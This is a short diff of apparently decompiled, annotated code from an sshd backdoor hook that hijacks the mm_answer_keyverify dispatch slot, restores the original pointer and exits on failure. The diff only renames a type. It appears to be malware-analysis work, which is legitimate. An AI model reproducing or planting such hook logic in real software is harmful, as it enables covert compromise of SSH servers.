@@ -32,7 +32,7 @@ int mm_answer_keyverify_hook(ssh *ssh,int sock,sshbuf *m)
         (write_result = fd_write(sock,*(void **)(sshd_ctx + 0x88),(ulong)*(ushort *)(sshd_ctx + 0x84),libc_imports),
         -1 < write_result)))) {
       // AutoDoc: Drop the preserved mm_answer_keyverify pointer back into the live dispatch slot before returning success.
-      **(undefined8 **)(sshd_ctx + 0xa0) = *(undefined8 *)(sshd_ctx + 0xd8);
+      **(u64 **)(sshd_ctx + 0xa0) = *(u64 *)(sshd_ctx + 0xd8);
       return 1;
     }
     // AutoDoc: Any missing metadata or short write forces an immediate `exit(0)` so sshd never continues with a half-applied hook.
